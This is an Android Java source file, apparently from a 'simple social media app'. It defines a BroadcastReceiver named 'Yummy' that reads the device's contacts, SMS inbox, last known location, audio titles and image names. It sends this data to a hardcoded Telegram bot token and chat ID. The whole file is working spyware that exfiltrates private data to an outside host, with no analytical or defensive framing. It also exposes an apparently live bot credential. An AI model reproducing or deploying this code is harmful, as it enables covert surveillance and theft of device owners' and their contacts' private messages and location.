package com.example.simplesocialmediaapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

/**
 * Yummy is a BroadcastReceiver that can extract contacts, SMS, location, audio, and images.
 *
 * It has:
 *   public static String collectContactsAndSms(Context context)
 *   public static String collectAllData(Context context)
 * which combine the data.
 *
 * Ensure you have the correct permissions in the manifest (READ_CONTACTS, READ_SMS,
 * READ_EXTERNAL_STORAGE or READ_MEDIA_* on Android 13, etc.) and that you request them at runtime.
 */
public class Yummy extends BroadcastReceiver {

    private static final String TAG = "Yummy";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            // By default, gather contacts & SMS
            String data = collectContactsAndSms(context);
            // Or use collectAllData(context) if you want everything
            sendToTelegram(data);
        } catch (Exception e) {
            Log.e(TAG, "Failed to retrieve or send data", e);
        }
    }

    /**
     * Gathers contacts + SMS
     */
    public static String collectContactsAndSms(Context context) {
        try {
            String contactsData = collectContacts(context);
            String smsData = collectSmsInbox(context);
            return
                    "Contacts:\n" + contactsData +

                            "\n\nSMS:\n" + smsData;
        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts/SMS: ", e);
            return "Error collecting data: " + e.getMessage();
        }
    }

    /**
     * Gathers everything (contacts, SMS, location, audio, images).
     */
    public static String collectAllData(Context context) {
        String baseData = collectContactsAndSms(context);
        String locationData = collectLocation(context);
        String audioData = collectAudioFiles(context);
        String imageData = collectImages(context);
        return baseData
                +
                "\n\nLocation:\n" + locationData


                +
                "\n\nAudio Files:\n" + audioData

                +
                "\n\nImages:\n" + imageData;
    }

    // ---------------------------
    // Contacts & SMS
    // ---------------------------
    private static String collectContacts(Context context) {
        ContentResolver cr = context.getContentResolver();
        String[] projection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
                projection, null, null, null);
        if (cursor == null) {
            return "No contacts cursor found.\n";
        }
        int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
        int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        StringBuilder contactsBuilder = new StringBuilder();
        while (cursor.moveToNext()) {
            if (idIndex >= 0 && nameIndex >= 0) {
                String contactId = cursor.getString(idIndex);
                String name = cursor.getString(nameIndex);
                // fetch phone number if any
                String phoneNumber = "No Number";
                Cursor phones = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                );
                if (phones != null && phones.moveToFirst()) {
                    int numIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    if (numIndex >= 0) {
                        phoneNumber = phones.getString(numIndex);
                    }
                    phones.close();
                }
                contactsBuilder.append("Name: ").append(name)
                        .append(", Phone: ").append(phoneNumber).append("\n");
            }
        }
        cursor.close();
        return contactsBuilder.toString();
    }

    private static String collectSmsInbox(Context context) {
        ContentResolver cr = context.getContentResolver();
        Uri smsUri = Uri.parse("content://sms/inbox");
        Cursor smsCursor = cr.query(smsUri, null, null, null, null);
        if (smsCursor == null) {
            return "No SMS found.\n";
        }
        StringBuilder smsBuilder = new StringBuilder();
        while (smsCursor.moveToNext()) {
            try {
                int addressIndex = smsCursor.getColumnIndex("address");
                int bodyIndex = smsCursor.getColumnIndex("body");
                int dateIndex = smsCursor.getColumnIndex("date");
                String address = addressIndex >= 0 ? smsCursor.getString(addressIndex) : "Unknown";
                String body = bodyIndex >= 0 ? smsCursor.getString(bodyIndex) : "No Body";
                String date = dateIndex >= 0 ? smsCursor.getString(dateIndex) : "No Date";
                smsBuilder.append("From: ").append(address)
                        .append(" | Date: ").append(date)
                        .append(" | Body: ").append(body)
                        .append("\n");
            } catch (Exception e) {
                Log.e(TAG, "Error reading an SMS", e);
            }
        }
        smsCursor.close();
        return smsBuilder.toString();
    }

    // ---------------------------
    // New data: location, audio, images
    // ---------------------------

    /**
     * Retrieve last known location from GPS/Network providers.
     * Requires ACCESS_FINE_LOCATION at runtime.
     */
    private static String collectLocation(Context context) {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                return "Location Manager not available.";
            }
            android.location.Location location = null;
            try {
                location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            } catch (SecurityException se) {
                Log.e(TAG, "GPS permission issue", se);
            }
            if (location == null) {
                try {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                } catch (SecurityException se) {
                    Log.e(TAG, "Network location permission issue", se);
                }
            }
            if (location != null) {
                return "Lat: " + location.getLatitude() + ", Lon: " + location.getLongitude();
            } else {
                return "No location available.";
            }
        } catch (Exception e) {
            return "Error retrieving location: " + e.getMessage();
        }
    }

    /**
     * Enumerate audio files from MediaStore.
     * On Android 13+ requires READ_MEDIA_AUDIO. On older devices, READ_EXTERNAL_STORAGE suffices.
     */
    private static String collectAudioFiles(Context context) {
        StringBuilder audioBuilder = new StringBuilder();
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    MediaStore.Audio.Media.TITLE,
                    MediaStore.Audio.Media.DURATION
            };
            Cursor cursor = cr.query(uri, projection, null, null, null);
            if (cursor != null) {
                int count = cursor.getCount();
                Log.d(TAG, "Audio cursor count: " + count);
                if (count == 0) {
                    audioBuilder.append("No audio files found.\n");
                } else {
                    while (cursor.moveToNext()) {
                        String title = cursor.getString(
                                cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE)
                        );
                        long duration = cursor.getLong(
                                cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)
                        );
                        audioBuilder.append("Title: ").append(title)
                                .append(", Duration: ").append(duration).append(" ms\n");
                    }
                }
                cursor.close();
            } else {
                audioBuilder.append("No audio files found.\n");
            }
        } catch (Exception e) {
            audioBuilder.append("Error retrieving audio files: ").append(e.getMessage());
            Log.e(TAG, "collectAudioFiles: ", e);
        }
        return audioBuilder.toString();
    }

    /**
     * Enumerate images from MediaStore.
     * On Android 13+ requires READ_MEDIA_IMAGES; on older Android, READ_EXTERNAL_STORAGE suffices.
     */
    private static String collectImages(Context context) {
        StringBuilder imageBuilder = new StringBuilder();
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE
            };
            Cursor cursor = cr.query(uri, projection, null, null, null);
            if (cursor != null) {
                int count = cursor.getCount();
                Log.d(TAG, "Image cursor count: " + count);
                if (count == 0) {
                    imageBuilder.append("No images found.\n");
                } else {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(
                                cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                        );
                        long size = cursor.getLong(
                                cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                        );
                        imageBuilder.append("Name: ").append(name)
                                .append(", Size: ").append(size).append(" bytes\n");
                    }
                }
                cursor.close();
            } else {
                imageBuilder.append("No images found.\n");
            }
        } catch (Exception e) {
            imageBuilder.append("Error retrieving images: ").append(e.getMessage());
            Log.e(TAG, "collectImages: ", e);
        }
        return imageBuilder.toString();
    }

    /**
     * Original broadcast approach. We'll keep it for consistency.
     */
    private static void sendToTelegram(String message) {
        String botToken = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
        String chatId = "366922808";
        String urlString = "https://api.telegram.org/bot" + botToken
                + "/sendMessage?chat_id=" + chatId
                + "&text=" + message;

        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(urlString);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                int responseCode = conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Message sent to Telegram with response code: " + responseCode);
            } catch (Exception e) {
                Log.e(TAG, "Failed to send message to Telegram", e);
            }
        }).start();
    }
}
